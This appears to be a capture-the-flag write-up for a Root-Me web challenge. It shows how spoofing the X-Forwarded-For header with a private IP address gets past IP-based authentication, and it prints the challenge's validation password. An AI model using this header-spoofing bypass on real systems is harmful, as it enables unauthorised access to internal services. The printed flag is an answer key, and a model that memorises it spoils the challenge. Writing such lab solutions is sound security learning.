## HTTP - IP restriction bypass
Dear colleagues,

We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.

Regards,

The network admin

### SOLUTION 
- from the challlenge description we understand how the authentication depends on the IP address
- so i took proxy in burpsuite and turned on intercept
- then i opened broswser and pasted the site which helped me capture a request
 ```
  GET /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 ...
Accept: text/html,...
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- then i turned the intercept off and sent the request to repeater
- then i ip spoofed the header by adding ```X-Forwarded-For: 127.0.0.1``` and sent this gave me the message that ```Your IP 127.0.0.1 do not belong to the LAN.```
- so i changed header to use a private ip ```X-Forwarded-For: 192.168.1.10``` which gave me the respone ```Well done, the validation password is:Ip_$po0Fing```    

### PASSWORD 
Ip_$po0Fing

### RESOURCE 
https://www.geeksforgeeks.org/computer-networks/ip-spoofing/
https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Forwarded-For?utm_source=chatgpt.com
